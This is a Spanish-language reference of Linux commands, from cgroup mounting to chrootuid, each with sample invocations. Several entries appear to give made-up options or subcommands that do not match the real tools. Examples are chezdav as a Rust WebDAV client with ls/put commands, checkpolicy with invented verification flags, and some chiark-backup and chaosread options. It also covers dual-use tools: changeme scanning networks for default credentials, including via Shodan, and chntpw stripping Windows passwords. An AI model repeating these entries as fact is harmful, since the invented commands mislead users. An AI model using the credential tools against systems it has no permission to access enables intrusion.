Si se necesita montar solo algunos subsistemas, se puede especificar manualmente en lugar de usar cgroupfs-mount. Por ejemplo:
# mount -t cgroup -o cpu none /sys/fs/cgroup/cpu
# mount -t cgroup -o memory none /sys/fs/cgroup/memory
# findmnt | grep cgroup (mostrará las entradas montadas en /sys/fs/cgroup)
# umount /sys/fs/cgroup/cpu (desmontar los subsistemas manualmente)
# umount /sys/fs/cgroup/memory
Nota.- En sistemas modernos que usan systemd, los cgroups suelen estar gestionados automáticamente por systemd, y el uso de cgroupfs-mount puede no ser necesario.


cgvg
Son un par de scripts de Perl, "cg" [Context Grep"] que realiza búsquedas contextuales en los archivos del código fuente y "vg" [Vim Grep] que permite abrir los resultados de búsqueda directamente en vim.
$ cg -C 3 main (buscará la palabra "main" en los archivos del directorio y mostrará 3 lineas arriba y 3 abajo. Por defecto 2)
$ cg -i main (busqueda insensible a mayúsculas)
$ cg --exclude=*.min.js --exclude=*.log main (excluye archivos o directorios específicos de la búsqueda)
$ vg (después de buscar, abrir los resultados en vim)
Nota.- Si se prefiere usar otro editor que no sea vim se puedes configurar el entorno con:
$ export EDITOR=nano


chacl
[acl]. Cambiar la lista de control [acl, Access Control Lists] de acceso de un archivo o directorio permitiendo establecer permisos detallados para usuarios y grupos específicos, más allá de los permisos tradicionales
       $ chacl -l archivo.txt
       archivo.txt [u::rw-,g::r--,o::r--]
$ chacl u::r-x,g::r-x,o::--x archivo.txt (cambia permisos de archivo.txt a propietario: lectura y ejecución, grupo: lectura y ejecución y otros solo ejecución)
$ chacl u:user:rwx archivo.txt (da al usuario "user" permisos de lectura, escritura y ejecución en el archivo archivo.txt)
$ chacl g:users:rw archivo.txt (al grupo "users" se le otorgan permisos de lectura y escritura en archivo.txt)
$ chacl -B archivo.txt (borra todas las ACL del archivo archivo.txt, dejando solo los permisos estándar de propietario, grupo y otros)
$ chacl -R u:user:r directorio/ (otorgar permiso de solo lectura al usuario "user" en el directorio "directorio/" y en todos los archivos y subdirectorios contenidos en él)
$ chacl d:u:user:rw directorio/ (establece una ACL por defecto para el usuario "user" en directorio/. Esta ACL se aplicará automáticamente a cualquier archivo nuevo que se cree dentro de ese directorio)


chafa
Visor de imágenes en ascii
$ chafa -C on -c full imagen.png (centrada y el máxino de color)
$ chafa -c 240 -s 50 imagen.png (a 240 colores y estableciendo mdedia de columnas y filas a 50)
$ chafa imagen.gif


chage
Establece/visualiza el número de días para cambio de contraseña
$ chage -l usuario   (muestras datos sobre la contraseña)
$ chage -M max_días -W aviso usuario
$ chage -d 0 usuario (en la siguiente entrada al sistema pedirá al usuario cambiar la contraseña)
-l: lista los parámetros actuales de la cuenta del usuario.
-m días: mínimo de días a transcurrir para que pueda cambiar la contraseña
-M días: máximo de días a partir del último cambio de cambio de la contraseña
-W: Días de antelación que se ha de avisar de que su contraseña va a caducar.
-I: Días que transcurren desde que caduca la contraseña del usuario hasta que la cuenta queda bloqueada. Si el valor es 0, la cuenta no está bloqueada después de que caduque la contraseña
-d días: Número de días desde Enero 1 de 1970 que la contraseña fué cambiada.
-E días: especifica fecha del bloqueo de la cuenta (formato YYYY-MM-DD)


chake
Permite gestionar varios hosts a través de SSH combinando chef [sistema de gestión de configuración que automatiza el despliegue y la administración de infraestructura] y rake [herramienta para la automatización de tareas basada en Ruby]. Es una herramienta útil para automatizar tareas relacionadas con la configuración y mantenimiento de servidores.
$ chake init (comenzar un nuevo proyecto y con una estructura de directorios básica con hosts.yml: Archivo donde se define los servidores y sus roles y Rakefile: Donde se define las tareas a ejecutar)
$ chake web:restart (conectará a los servidores definidos en hosts.yml con el rol web y ejecutará el comando para reiniciar Nginx)
$ chake exec "uptime" --roles web (ejecutará el comando uptime en todos los servidores con el rol web)
$ chake task_name --hosts web1 (ejecuta la tarea solo en un host específico)
$ chake task_name --roles db (filtra los hosts por rol)
$ chake deploy:app --dry-run (simula la ejecución de las tareas sin ejecutarlas realmente)
Un ejemplo de hosts.yml podría ser:
           hosts:
             web1:
                 address: web1.example.com
                 roles: [web, app]
             db1:
                 address: db1.example.com
                 roles: [db]
Un ejemplo de Rakefile para agregar tareas específicas. Por ejemplo, una tarea para reiniciar un servicio web:
           namespace :web do
             desc "Reinicia el servidor web"
             task :restart do
                 on roles(:web) do |host|
             run "sudo systemctl restart nginx"
                 end
             end
           end
Ejemplo usando variables:
        namespace :deploy do
          desc "Despliega la aplicación"
          task :app, [:branch] do |t, args|
              branch = args[:branch] || "main"
              on roles(:app) do |host|
                    run "git pull origin #{branch}"
                    run "bundle install"
                    run "rails db:migrate"
              end
          end
        end
$ chake deploy:app[feature-branch] (pasar variables para personalizar las tareas)


chalow
Convierte los archivos changelog a páginas html para visualizar con el navegador.
$ chalow -d /home/pep/dades/arxius_importants/dotemacs.d/.emacs.d/elpa/muse-3.20.2/ChangeLog


changeme
Este paquete contiene un escáner de credenciales predeterminado. Los escáneres de vulnerabilidades comerciales no detectan las credenciales predeterminadas más comunes. Agregar credenciales predeterminadas a los escáneres comerciales suele ser difícil y lento. changeme está diseñado para que sea sencillo agregar nuevas credenciales sin tener que escribir ningún código ni módulo. changeme mantiene los datos de las credenciales separados del código. Todas las credenciales se almacenan en archivos yaml para que puedan ser leídas y procesadas.
$ changeme 192.168.18.4 --timeout 14 (scaneo de una sola host y con tiempo de espera para las conexiones de 15 segundos. Por defecto 10)
$ changeme --protocols ssh,ssh_key 192.168.59.0/24 (uso con diferentes protocolos)
$ changeme 192.168.59.0/24 -o scan.txt (escaneo de un rango de ips y gardar en scan.txt)
$ changeme --shodan_query "Server: SQ-WEBCAM" --shodan_key keygoeshere -c amera (escaneo utilizando una consulta Shodan)


changetrack
Muestra los cambios que se producen en un conjunto de archivos especificado. Está diseñado para ejecutarse como un trabajo cron. Descomentar los directorios que queremos monitorizar si se produce algun cambio en:
# nano /etc/changetrack.conf
O editar el archivo ~/.changetrackrc y colocar la ruta absoluta de cada archivo a monitorear o por ejemplo, todo el directorio personal $HOME/*. Pueden ponerse comentarios com "#".
# changetrack (lanzar la aplicación)
# ls .changetrack (visualizar los archivos modificados)


chaos-marmosets
Este proyecto contiene pequeños programas que se comportan mal y se pueden utilizar para la ingeniería del caos para probar el comportamiento del sistema y la configuración de la infraestructura para esos casos. Incluye las herramientas: divide-by-zero [intenta dividir un número por cero. Saldrá inmediatamente con la señal 4 - SIGILL], leak-memory [probar las limitaciones de memoria] y seg-fault [probar la configuración del volcado de núcleo de un proceso]
$ divide-by-zero
$ leak-memory (memoria a asignar en MiB, 42 TiB por defecto)
$ seg-fault


chaosread
Utilidad que extrae datos de un dispositivo de tipo /dev/chaos. Este dispositivo proporciona números aleatorios generados por el núcleo del sistema.
$ chaosread (obtener un único número aleatorio)
Nota.- Si aparece el mensaje "No chaoskey" indica que el comando chaosread no puede encontrar un dispositivo de hardware llamado ChaosKey conectado al sistema. El ChaosKey es un dispositivo físico de generación de números aleatorios, que se conecta típicamente a través de USB y que proporciona una fuente de entropía al sistema operativo.
$ chaosread --length=100 (definir la cantidad de datos a leer. Por ejemplo, para leer 100 bytes)
$ chaosread --infinite (generar datos hasta que lo detengas manualmente con Ctrl-c)
$ chaosread --raw (obtener datos sin procesar)
$ chaosread --cooked (datos procesados o interpretados de manera predeterminada)
$ chaosread --bytes (extraer datos en formato binario)
$ chaosread --serial=123456 (especificar el serial de un dispositivo concreto)


chaosreader
Herramienta para analizar capturas de tráfico de red en formato de registros tcpdump o snoop [.pcap, .cap, o .snoop]. Puede reconstruir sesiones TCP/UDP y extraer datos relevantes como archivos, imágenes, correos electrónicos o tráfico HTTP. Se crea un archivo de índice html que vincula a todos los detalles de la sesión, incluidos los programas de reproducción en tiempo real para sesiones telnet, rlogin, IRC, X11 y VNC.
$ chaosreader capture.pcap (genera un conjunto de archivos HTML y directorios con el análisis de las sesiones rastreadas)
$ chaosreader -p 80 capture.pcap (reconstruye sesiones relacionadas solo con ese puerto)
$ chaosreader -s "2024-12-25 14:00:00" -e "2024-12-25 15:00:00" capture.pcap (analizar solo las ocurridas en un rango de tiempo específico con la opción -s [inicio] y -e [fin])
$ chaosreader capture.pcap --http (reconstruir las páginas web transferidas en las sesiones)
$ chaosreader -o /path/to/output capture.pcap (por defecto, crea un directorio en el lugar donde se ejecuta, con la opción "-o" se especifica otro)
$ chaosreader --verbose capture.pcap (ver las sesiones activas mientrasse analiza en tiempo real)
$ chaosreader --ip 192.168.1.100 capture.pcap (limitar el análisis a un rango o una dirección IP específica alas que involucren 192.168.1.100)
Nota.- Se puede capturar tráfico usando herramientas como tcpdump:
# tcpdump -w capture.pcap


chardet
Detector de codificación.
$ chardet archivo


charon-cmd
Parte de la suite StrongSwan y es una herramienta para gestionar conexiones IPsec utilizando la pila nativa de IPsec del kernel estándar de Linux sin necesidad de un demonio persistente. Admite los protocolos IKEv1 e IKEv2.
$ charon-cmd --file config.json (conectar a un servidor IPsec especificando un archivo de configuración en formato JSON)
Ejemplo de archivo config.json que configura una conexión hacia un servidor remoto con autenticación basada en un secreto compartido:
        {
            "remote": "192.168.1.1",
            "local": "0.0.0.0",
            "auth": {
                "id": "client@example.com",
                "secret": "mypassword"
            },
            "ike": {
                "encryption": "aes128gcm16",
                "prf": "sha256",
                "dhgroup": "modp2048"
            },
            "esp": {
                "encryption": "aes128gcm16",
                "integrity": "sha256"
            }
        }


charon-systemd
Implementación de StrongSwan que se ejecuta como un servicio gestionado por systemd. Se utiliza para configurar y gestionar conexiones IPsec en sistemas que emplean un enfoque persistente, integrando configuraciones detalladas en /etc/ipsec.conf y /etc/ipsec.secrets.
# systemctl start charon-systemd (habilita el servicio)
# systemctl enable charon-systemd ( al inicio del sistema al inicio del sistema)
Ejemplo de conexio IPsec:
# nano /etc/ipsec.conf
       conn myvpn
           keyexchange=ikev2
           left=%defaultroute
           leftid=@client.example.com
           leftauth=psk
           right=192.168.1.1
           rightid=@server.example.com
           rightauth=psk
           auto=start
Luego, se añade el secreto compartido en
# nano /etc/ipsec.secrets
client.example.com : PSK "mypassword"
# ipsec reload (recargar las configuraciones
# ipsec up myvpn (iniciar una conexión)
# ipsec down myvpn (cerrar la conexión)


chase
Utilidad para rastrear el archivo real al que apunta un enlace simbólico.
$ chase link


chattr
[ver lsattr]. Cambia los atributos de ficheros (bloquea el fichero).
# chattr +i /etc/resolv.conf (impedirá modificaciones por  procesos o por root)
# chattr -i /etc/resolv.conf    (lo desbloquea)
# chattr -V -R +i /home/usuario/directorio (bloqueo recursivo y mostrando toda la información)
# chattr +a  archivo (desactiva el acceso al fichero excepto para añadir datos)


chaussette
Es un servidor WSGI [Web Server Gateway Interface] que se puede usar para escribir programas ques puedan comunicarse a través del protocolo HTTP.
$ chaussette /python/app.py (ejecutar la aplicación)
Para acceder a la aplicación desde un navegador en otro dispositivo de la red local:
http://ip-de-tu-computadora:5000


chdir
Cambiar a otro directorio como el comando cd [ver].
$ chdir /var/www/html


cheat
[python-pip git] Muestra chuletas de algunos comandos. Permite construir nuestras propias chuletas colocandolas en el directorio que muestra la opcion -d. Descarga e instalacion:
	# pip install docopt pygments
	$ git clone https://github.com/chrisallenlane/cheat.git
	$ cd cheat
	# python setup.py install
	$ wget https://github.com/chrisallenlane/cheat/raw/master/cheat/autocompletion/cheat.bash
	# cp cheat.bash /etc/bash_completion.d/
$ cheat -l (Listado de los comandos)
$ cheat ifconfig (Muestra la chuleta de ifconfig)
$ cheat -d (Muestra el directorio de las chuletas)
$ cheat -e ifconfig (Pregunta si queremos crear una copia de la chuleta ifconfig en nuestro $HOME para modificarla. Tendra prioridad sobre la del sistema)
1-
Con python-pip instalado tambien podemos instalarla con:
# pip install cheat


check-bios-nx
Determinar si la BIOS ha bloqueado las capacidades NX de la CPU.
$ check-bios-nx –verbose
ok: the NX bit is operational on this CPU.


check-enhancements
[debian-goodies]. Muestra paquetes con versiones mejoradas. És un proceso lento.
# check-enhancemets -ip


check_forensic
Comprueba en el registro de las solicitudes a apache las que no se completaron correctamente y genera un registro de solicitudes para cada una.
# check_forensic /var/log/apache2/access.log


check-language-support
Listado de paquetes de idiomas instalados en el sistema.
$ check-language-support -l es
$ check-language-support -a (todos)


check-support-status
[debian-security-support]. Comprueba los paquetes instalados si tienen soporte de seguridad. Según Debian: Desafortunadamente, ha sido necesario limitar el soporte de seguridad para algunos
paquetes.
$ check-support-status (Muestra los que no tienen soporte de seguridad)


checkbashisms
Realiza comprobaciones básicas en scripts de shell /bin/sh por la posible presencia de bashisms. La definición de bashism equivale a "una función de shell que no se requiere que sea soportada por POSIX "; esto significa que algunos problemas marcados pueden ser permitidos bajo secciones opcionales de POSIX. En los casos en que POSIX y Debian Policy no coincidan, los checkbashisms, de forma predeterminada, permiten extensiones permitidas por Policy pero también pueden proporcionar opciones para una verificación más estricta.
$ checkbashims script.sh


checkbot
Verifica enlaces internos o externos de una url.
$ checkbot http://google.com (básico)
$ checkbot --mailto usuario@correo.org http://google.com (enciar correo cuando termine el escaneo)


checkgid
Programa que verifica si el usuario se puede establecer en el grupo de apache2. Esto es para ver si es un grupo válido para que apache2 lo use en tiempo de ejecución. Ha de ejecutarse como superusuario.
# checkgid (si no devuelve nada es correcto)
# checkgid user (si no devuelve nada, user está en el grupo y puede configurarlo)


checkinstall
lleva un registro de todos los archivos creados o modificados por el script de instalación ["make install", "make install_modules", "setup", etc.], crea un paquete binario estándar y lo instala en el sistema, lo que permite desinstalarlo con las utilidades de administración de paquetes estándar.
# checkinstall --pkgname=miaplicacion --maintainer="Tu Nombre <tu@email.com>" --dependency-install=yes --dependency-tracking=yes --install=no --no-edit ./configure && make && make install (instalar una aplicación desde fuente)
# checkinstall --pkgname=otraaplicacion --maintainer="Tu Nombre <tu@email.com>" --dependency-install=yes --dependency-tracking=yes --install=no /ruta/a/tu/script/de-instalacion.sh (usar con scripts de instalación existentes)
# checkinstall --pkgname=modulosadicionales --maintainer="Tu Nombre <tu@email.com>" --dependency-install=yes --dependency-tracking=yes --install=no make install_modules (instalar módulos adicionale)
# checkinstall --pkgname=miaplicacion-pip --maintainer="Tu Nombre <tu@email.com>" --dependency-install=yes --dependency-tracking=yes --install=no python setup.py install (usar con setup.py)
Notas.- En los ejemplos, "--pkgname" define el nombre del paquete que se creará, "--maintainer" especifica el mantenedor y su correo electrónico, "--dependency-install=yes" instala las dependencias, "--dependency-tracking=yes" registra las dependencias, "--install=no" evita la ejecución automática de la instalación y los comandos después de `&&` son los pasos de compilación o ejecución del script.


checkint
[netdiag]. Muestra todas las interfaces de red activas
$ checking


checkit_tiff
Verificar la conformidad de archivos TIFF.
$ checkit_tiff /ruta/al/archivo.tif (analizará el archivo especificado y mostrará los resultados)
$ find /ruta/carpeta/ -name "*.tif" -exec checkit_tiff {} \; (verificar múltiples archivos TIFF en una carpeta)
$ checkit_tiff /ruta/al/archivo.tif --verbose | grep -i error (mostrará solo las líneas que contienen errores)
$ checkit_tiff /ruta/al/archivo.tif --ignore=error_type1,error_type2 (especificar qué tipos de errores ignorar si no son críticos)


checklink
[w3c-linkchecker]. Programa que lee un documento HTML o XHTML, extrae una lista de urls y enlaces y comprueba que ninguno esté definido dos veces y que todos los enlaces sean correctos.
$ checklink -b archivo.html (mostrar sólo los enlaces rotos, no las redirecciones)
$ checklink -s archivo.html (mostrar sólo el resumen de resultados)


checklistlinux
Herramienta para auditar la seguridad del sistema, verificando configuraciones, variables y consejos con las mejores practicas de seguridad.
$ checklistlinux (al acabar la auditoria muestra el nombre de los .html donde se han guardar lo resultados)


checkpolicy
Es parte de SELinux [Security-Enhanced Linux], parche del núcleo y se utiliza principalmente para verificar políticas de seguridad. SELinux tiene que estar habilitado en el sistema.
# checkpolicy -V /etc/selinux/targeted/policy/policy.28 (verifica si existe la política especificada)
# checkpolicy -M /etc/selinux/targeted/policy/policy.28 (muestra detalles sobre la política, como su versión y fecha de creación)
# checkpolicy -c ustom_policy.te (validar una política personalizada, "custom_policy.te" sería un archivo de este tipo)
# checkpolicy -s cutom_policy.te (analiza la sintaxis de la política personalizada)
# checkpolicy -D /etc/selinux/targeted/policy/policy.28 (muestra las dependencias de la política)
# checkpolicy -Z (muestra el estado actual de las políticas cargadas)


checkpw
Verificar contraseñas de cuentas de correo electrónico.
# checkpw username (verificar la contraseña de un usuario específico)
# checkpw -f /var/mail/user1 username (verificar la contraseña de un usuario específico en un directorio de correo)


checkrestart
[debian-goodies]. Muestra procesos activos que están utilizando una versión anterior de algún fichero que haya sido actualizado. A veces una actualización trae nuevas bibliotecas del sistema y los procesos que se esten ejecutando siguen utilizando las versiones anteriores de estas bibliotecas. En sistemas Debian GNU/Linux estables, generalmente se necesita para eliminar un exposición del sistema a una vulnerabilidad que podría haberse solucionado actualizando una biblioteca que utiliza algún proceso. Tambien se usa para encontrar versiones desactualizadas de bibliotecas en uso.
# checkrestart -a (muestra todos)
# checkrestart -p chromium (referente a un paquete)
# checkrestart -i 1912 (referente a un PID)
Nota.- Aunque la salida muestre gran cantidad de paquetes [por ejemplo por tener una "testing" o por una actualización del navegador mientras este está activo] no es preciso reiniciar el sistema o la aplicación pero es aconsejable.


checksec
script diseñado para probar qué características estándar de seguridad del sistema operativo Linux y PaX se están utilizando.
# checksec -k (del kernel)
# checksec -fp 1 (comprueba el proceso con PID 1)
# checksec -o xml -pa (de todos los procesos y la salida como .xml)


checksecurity
Realiza comprobaciones de seguridad muy básicas del sistema tales como: sistemas de archivos remotos montados de forma insegura, cambios en los programas setuid, cambios en los puertos abiertos para detectar programas maliciosos, cuentas del sistema vacías o duplicadas, sistemas de archivos montados cercanos a su capacidad, registros generados por iptables con intentos de intrusión... Los informes se guardan en /var/log/setuid/setuid.changes. Si se desea que la información se envie a root, descomentar la linea #CHECKSECURITY_EMAIL="root" en el archivo de configuración /etc/checksecurity.conf
# checksecurity


checkupdates
Utilidad que se utiliza para comprobar si hay actualizaciones de paquetes disponibles en el administrador de paquetes del sistema. Es parte del administrador de paquetes pacman en Arch Linux y sus derivados.
# checkupdates (Lista de actualizaciones pendientes)
# checkupdates --download (Enumerar las actualizaciones pendientes y descargar los paquetes al caché de pacman)


chemeq
Al entar una cadena genera su código LaTeX
$ echo "H2 + SO4 ---> H2SO4" | chemeq -lc
       \mathrm{H}_{2}\,+\,\mathrm{S}\mathrm{O}_{4}\,\longrightarrow\,\mathrm{H}_{2}\mathrm{S}\mathrm{O}_{4}
       OK
$ echo "(OH)2P(O)OP(O)(OH)2" | chemeq (del acido pirofosfórico)
$ echo "MnO4^- + 8H3O^+ + 5e- --> Mn^2+ + 12 H2O" | chemeq -w


cherokee
Servidor web
# cherokee-admin -b (iniciar el gestor. En el navegador: localhost:9090)
# cherokee-admin -b -u (No pida la contraseña)
# cherokee-admin -b -p 9091 (especificar un puerto para la gestión)


chezdav
Cliente WebDAV implementado en Rust que permite compartir directorios y gestionar archivos remotos.
$ chezdav ls https://example.com/webdav --username yourusername --password yourpassword (mostrará los archivos y directorios disponibles en la URL proporcionada)
$ chezdav put /path/to/local/file.txt https://example.com/webdav/remote/file.txt --username yourusername --password yourpassword (subirá file.txt desde el sistema local al servidor en la ubicación especificada)
$ chezdav get https://example.com/webdav/remote/file.txt /path/to/local/file.txt --username yourusername --password yourpassword (guarda el archivo remoto file.txt en el directorio local especificado)
$ chezdav delete https://example.com/webdav/remote/file.txt --username yourusername --password yourpassword (elimina file.txt del servidor)
$ chezdav mkdir https://example.com/webdav/new-directory --username yourusername --password yourpassword (crea el directorio "new-directory" en la ruta especificada)


chflags
Cambiar flags de un archivo o carpeta.
$ chflags -R nouchg DIR (de forma recursiva y que el archivo se puede cambiar)
$ chflags -r uchg file (recursiva y que el archivo no se puede cambiar)
$ chflags -R -L DIR (recursiva y siguiendo enlaces simbolicos)


chfn
modifica la información personal del usuario [nombre, domicilio, teléfono….]
$ chfn usuario (permite modificar todos los datos del usuario)
Opciones
	-f nombre_completo
	-r domicilio
	-w teléfono_trabajo
	-h teléfono_particular
	-o otros datos


chgrp
Cambia el grupo al que pertenece un archivo.
$ chgrp grupo archivo


chiark-backup
Sistema de respaldo para pequeños sistemas y redes. Estos son los scripts de respaldo que utilizan chiark.greenend.org.uk y otros sistemas que pertenecen a la Sinister Greenend Organisation.
# chiark-backup init ~/respaldo (iniciar una nueva copia de seguridad)
# chiark-backup back ~/respaldo (realizar una copia de seguridad completa)
# chiark-backup restore ~/respaldo (restaurar desde una copia de seguridad)
# chiark-backup status ~/respaldo (verificar el estado de un respaldo específico)
# chiark-backup remove ~/respaldo (eliminar un respaldo)
# chiark-backup schedule ~/respaldo --daily (configurar una tarea programada para realizar copias de seguridad diarias)


chkboot
Busca modificaciones no deseadas en el archivo /boot. El archivo de configuración esta en /etc/default/chkboot
# chkboot-check (imprime los cambios detectados en archivos de arranque)
# chkboot-desktopalert (notifica cambios detectados en archivos de arranque)
# chkboot -u (Marcar los cambios como válidos. La próxima ejecución no advertirá sobre las diferencias)
# chkboot (forma básica)


chkconfig
Para activar y desactivar servicios, ver su estado y runlevel
# chkconfig --list (muestra listado de todos los servicios y nivel de ejecución)
# chkconfig --list apache2 (muestra nivel de ejecución del especificado)
# chkconfig --level 35 apache2 on (Para arrancar apache2 con runlevel 3 y5)
# chkconfig --level 345 nscd off (Desactivar nscd en los runlevel 3, 4 y 5)
# chkconfig --del sshd  (Quitar un servicio del arranque)
# chkconfig smb  (Indica si el servicio está activo o inactivo)
# chkconfig --list | grep '3:on' (Mostrar los servicios que se ejecutan en el runlevel 3)
# chkconfig mysql off (Desactiva mysql)


chkdupexe
Buscar duplicados en ejecutables.
$ chkdupexe


chklastlog
[chkrootkit]. Lee las entradas en el archivo /var/log/wtmp (archivo con información sobre inicios y cierres de sesión) y comprueba cada usuario encontrado en este archivo si también hay una entrada en el archivo /var/log/lastlog. El programa se quejará de los ID de un usuario con inicios de sesión pero sin información de cierre de sesión.
# chklastlog


chkrootkit
[incluye las aplicaciones chkwtmp y chklastlog]. Buscador de rootkits infiltrados en el sistema. Al ser un paquete bastante antiguo es preferible usar rkhunter para evitar muchos falsos WARNINGS, especialmente en archivos ocultos.
# chkrootkit  (lanzar la aplicación)
# chkrootkit -l  (visualizar las opciones de escaneo)
# chkrootkit sshd tcpd  (verificar solo dos opciones)
# chkrootkit -q (sólo mostrar los archivos conflictivos)
# chkrootkit -x (puede examinar cadenas sospechosas en los programas binarios que pueden indicar un troyano)


chkservice
Systemd es un daemon del sistema que permite administrar los servicios que corren en la distribución Linux y se trata de un reemplazo de init que se ha convertido en estándar. En realidad chkservice hace lo mismo que systemctl para administrar dichos servicios.
# chkservice
La información que muestra en la primera linea indica:
	[x] (unidad habilitada)
	[ ] (unidad deshabilitada)
	[s] (unidad estática)
	-m- (unidad enmascarada)
	=   (unidad que se ha detenido)
	>   (unidad funcionando)
Claves para interactuar con los servicios:
	r      (Actualizar o recargar información)
	Space  (Habilitar o deshabilitar una unidad)
	s      (Iniciar o detener una unidad)
	q      (salir)


chkwtmp
[chkrootkit]. Examina el archivo /var/log/wtmp en busca de entradas sin información y que solo contengan bytes nulos. Si se encuentran tales entradas las imprime.
# chkwtmp (Verificar alteración de logs. Si no muestra nada: bien)


chmod
Gestión de permisos de los ficheros y directorios.
$ chmod ugo+rwx -R /home/usuario/directorio  (todos los permisos a todos los usuarios sobre el directorio y subdirectorios)
$ chmod 777 -R /home/usuario/directorio (Equivalente en octal)
$ chmod a+w archivo (permiso de escritura para todos)
$ chmod 222 -R /home/usuario/directorio (Equivalente en octal)
$ chmod -w archivo (Quitar permiso de escritura a un archivo)
$ chmod +x archivo (Dar permiso de ejecución)
$ chmod 744 archivo (Lectura, escritura y ejecución para el usuario y sólo lectura para el grupo y otros)
$ chmod u=rwx,go=r archivo (Equivalente en alfabético)
$ chmod --reference=file1 file2 (Otorgar los mismos permisos de file1 a file2)
Código numérico (octal):
	1 = ejecución [x]
	2 = escritura [w]
	3 (1+2) = escritura y ejecución [xw]
	4 = lectura [r]
	5 (4+1) = lectura y ejecución [rx]
	6 (4+2) = lectura y escritura [rw]
	7 (4+2+1) = lectura, escritura y ejecución [wxr]
Código alfabético:
r (lectura), w (escritura), x (ejecución)
u (usuario), g (grupo), o (otros), a (para todos)
Nota.- Cuando un directorio está marcado como ejecutable [x] significa que se puede mirar dentro [ls] o entrar en él [cd]
1.-
Los permisos de un directorio web [/var/www/html/...] se aconseja que sean 755 para los directorios y subdirectorios y 644 para los ficheros.


chntpw
Quitar o modificar contraseñas en sistemas windows.
# cd /media/sdXX/WINDOWS/system32/config  (Entrar en el directorio)
# chntpw SAM (quitar o modificar la contraseña del administrador)
# chntpw -u USUARIO SAM  (quitar o modificar la contraseña de un usuario concreto)
Aparece un menú de 5 opciones. Borrar contraseña es la opción 1 modificarla la 2.


choose
Proporciona una manera de extraer datos de archivos de texto.
$ cat archivo.txt | choose 4 (Imprima el quinto elemento de todas las línea del texto especificado. "0" sería el primero)
$ cat /etc/passwd | choose --field-separator ':' 0 2 4 (Imprima el primer, tercer y quinto elementos de cada línea, donde los elementos están separados por ':' en lugar de espacios en blanco)
$ cat archivo.txt | choose 1:4 (imprime desde el segundo al quinto elemento de cada línea, incluido el quinto)
$ cat archivo.txt | choose :2 (Imprime desde el comienzo de cada línea hasta el tercer elemento)
$ cat archivo.txt | choose --exclusive :2 (Imprimir desde el principio de cada línea hasta el segundo elemento excluyendo a partir del tercero)
$ cat archivo.txt | choose 2: (Imprimir todos los elementos desde el tercero hasta el final de cada línea)
$ cat archivo.txt | choose -1 (Imprima el último elemento de cada línea)


chown
Cambio de propietario de un archivo o directorio.
# chown usuario archivo
# chown -R usuario directorio (afecta al directorio y todos los subdirectorios)
# chown -R usuario:grupo directorio
# chown --reference=file1 file2 (Mismo propietario y grupo para file2 que file1)


chpasswd
Establecer contraseñas para usuarios de un sistema
# echo "usuario:1234" | chpasswd -m (Que la guarde en /etc/shadow en formato md5)
# chpasswd   (Esperará la introducción de datos que consistiran en pares de nombre_de_usuario:contraseña, un par por línea. Con ctrl+D finaliza:
usuario1:passwd1
usuario2:passwd2


chpst
[runit]. Se utiliza para cambiar ciertos aspectos del entorno de ejecución de un proceso, como el usuario, grupo, límites de recursos, etc.
$ chpst -u www-data:www-data /usr/sbin/nginx (ejecutar nginx como un usuario y grupo especificos)
$ chpst -M 512M /usr/bin/python script.py (limitar la cantidad máxima de memoria física y virtual que un proceso)
$ chpst -u www-data -o 100 /usr/sbin/nginx (limita a Nginx a abrir un máximo de 100 archivos simultáneamente)
$ chpst -u www-data -D /var/www/ /usr/sbin/nginx (ejecuta Nginx en un entorno chroot dentro del directorio /var/www)
$ chpst -c 100 /usr/bin/python script.py (uso de CPU al 100% [que el proceso podrá usar completamente un núcleo de la CPU])


chromium
Navegador web. El perfil por defecto está en /home/usuario/.config/chromium, para crear nuevos perfiles [El inicio del parámetro son 2 guiones]:
$ mkdir /home/usuario/.config/chromium-dos
$ chromium --user-data-dir=/home/usuario/.config/chromium-dos
$ chromium --proxy-server="socks://localhost:9050" (Arrancar la aplicación a través de un proxy)
$ chromium --incognito (Arrancar en modo privado. Para incluir por defecto este modo en las propiedades del navegador: chromium --incognito %U)
1.-
Cuando al lanzar chromium no da la salida:
       ... ERROR:process_singleton_posix.cc(358)] The profile appears to be in use by another Chromium process...
Lanzar:
$ rm ~/.config/chromium/Singleton*
2.-
Activar las descargas paralelas
En la barra de direcciones escribir: chrome://flags y pulsa Enter.
En el buscador de la parte superior escribir: Parallel downloading
En la opción del menú desplegable que aparece, seleccionar: Enabled


chroma-curses
Juego de rompecabezas abstracto. Una variedad de formas coloridas se disponen en una serie de patrones cada vez más complejos, formando trampas diabólicas que deben desactivarse y rompecabezas misteriosos que deben manipularse para revelar sus sutiles secretos. Al principio es tan sencillo que cualquiera puede empezar a jugar, pero gradualmente se vuelve lo suficientemente difícil como para poner a prueba incluso a las mentes más brillantes.
$ chroma-curses


chronic
[moreutils]. Mostrará el error por la salida estándar si el comando falla, tiene salida nula o se bloquea. Si el comando se ejecuta correctamente se ocultará cualquier salida.
$ chronic ls (No mostrará nada porque el comando ls se ejecuta correctamente)
$ chronic lx (Mostrará el error)
$ chronic man (Mostrará que necesita otro dato)


chrony
Sincronizar el reloj del sistema. Primero incluir los servidores en el archivo de configuración:
# nano /etc/chrony/chrony.conf
Añadir las lineas:
       pool 3.es.pool.ntp.org iburst
       pool ntp.redimadrid.es iburst
       pool europe.pool.ntp.org iburst
Reinicar el servicio y comprobar que está activo:
# systemctl restart chronyd
# systemctl status chronyd
# chronyc makestep (forzar la sincronización)
# chronyc tracking (comprobar el seguimiento)
# chronyc sources (ver una lista de las fuentes de servidores de hora)


chroot
Situarte virtualmente donde le indicas como raiz.
# chroot /media/sda3
1.-
Ejemplo de un proceso para restituir grub2 despues de una instalación de un windows:
Arrancar el live cd, abrir consola y (Asumimos que la partición que tiene el grub a instalar es la sda5:
	$ sudo su
	# mkdir /media/sda5
	# mount /dev/sda5 /media/sda5
	# mount -o bind /dev/ /media/sda5/dev/
	# mount -o bind /sys/ /media/sda5/sys/
	# mount -o bind /proc/ /media/sda5/proc/
	# chroot /media/sda5
	# update-grub
	# grub-install /dev/sda
Si precisamos conexión y esta no se realiza:
# nano /etc/resolv.conf
Y colocar:   nameserver 8.8.8.8
O en su defecto la ip del router [nameserver 192.168.1.1]


chrootuid
facilita la ejecución de un servicio de red con un nivel de privilegios bajo y con acceso restringido al sistema de archivos. Los daemons tienen acceso solo a su propio árbol de directorios y se ejecutan bajo un ID de usuario con privilegios bajos.
$ chrootuid /var/www/ www-data /usr/sbin/nginx -g "daemon off;" (ejecutar un servidor web desde un entorno restringido, con un usuario no privilegiado [www-data] y ejecutando nginx dentro del entorno restringido)
